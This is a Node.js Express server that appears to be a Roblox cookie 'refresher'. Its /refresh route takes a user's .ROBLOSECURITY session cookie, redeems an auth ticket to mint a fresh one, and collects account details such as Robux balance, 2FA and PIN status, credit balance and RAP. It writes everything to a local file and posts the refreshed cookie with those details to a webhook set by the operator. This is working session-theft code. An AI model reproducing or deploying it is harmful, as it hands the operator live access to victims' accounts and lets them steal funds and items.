const express = require('express');
const axios = require('axios');
const fs = require('fs');

// Import functions from refresh.js
const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Debugging: Log imported functions
console.log("Imported Functions from refresh.js:", { generateAuthTicket, redeemAuthTicket });

app.get('/refresh', async (req, res) => {
    try {
        const roblosecurityCookie = req.query.cookie;
        if (!roblosecurityCookie) {
            return res.status(400).json({ error: "Missing 'cookie' query parameter." });
        }

        console.log("Received Cookie:", roblosecurityCookie);

        const authTicket = await generateAuthTicket(roblosecurityCookie);
        console.log("Generated Auth Ticket:", authTicket);

        if (authTicket === "Failed to fetch auth ticket") {
            return res.status(400).json({ error: "Invalid cookie" });
        }

        const redemptionResult = await redeemAuthTicket(authTicket);
        console.log("Redemption Result:", redemptionResult);

        if (!redemptionResult.success) {
            return res.status(401).json({ error: "Unauthorized: Invalid cookie." });
        }

        const refreshedCookie = redemptionResult.refreshedCookie || '';
        console.log("Refreshed Cookie:", refreshedCookie);

        const robloxUser = await RobloxUser.register(roblosecurityCookie);
        const userData = await robloxUser.getUserData();

        const fileContent = {
            RefreshedCookie: refreshedCookie,
            DebugInfo: `Auth Ticket ID: ${authTicket}`,
            Username: userData.username,
            UserID: userData.uid,
            DisplayName: userData.displayName,
            CreationDate: userData.createdAt,
            Country: userData.country,
            AccountBalanceRobux: userData.balance,
            Is2FAEnabled: userData.isTwoStepVerificationEnabled,
            IsPINEnabled: userData.isPinEnabled,
            IsPremium: userData.isPremium,
            CreditBalance: userData.creditbalance,
            RAP: userData.rap,
        };

        fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));

        const webhookURL = 'HOOK_HERE'; // Replace with actual webhook URL
        await axios.post(webhookURL, {
            embeds: [
                {
                    title: 'Refreshed Cookie',
                    description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
                    color: 16776960,
                    thumbnail: {
                        url: userData.avatarUrl,
                    },
                    fields: [
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User ID', value: userData.uid, inline: true },
                        { name: 'Display Name', value: userData.displayName, inline: true },
                        { name: 'Creation Date', value: userData.createdAt, inline: true },
                        { name: 'Country', value: userData.country, inline: true },
                        { name: 'Account Balance (Robux)', value: userData.balance, inline: true },
                        { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled, inline: true },
                        { name: 'Is PIN Enabled', value: userData.isPinEnabled, inline: true },
                        { name: 'Is Premium', value: userData.isPremium, inline: true },
                        { name: 'Credit Balance', value: userData.creditbalance, inline: true },
                        { name: 'RAP', value: userData.rap, inline: true },
                    ],
                }
            ]
        });

        console.log('Webhook Sent Successfully');

        res.json({ authTicket, redemptionResult });

    } catch (error) {
        console.error("Error in /refresh route:", error);
        res.status(500).json({ error: "Internal Server Error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
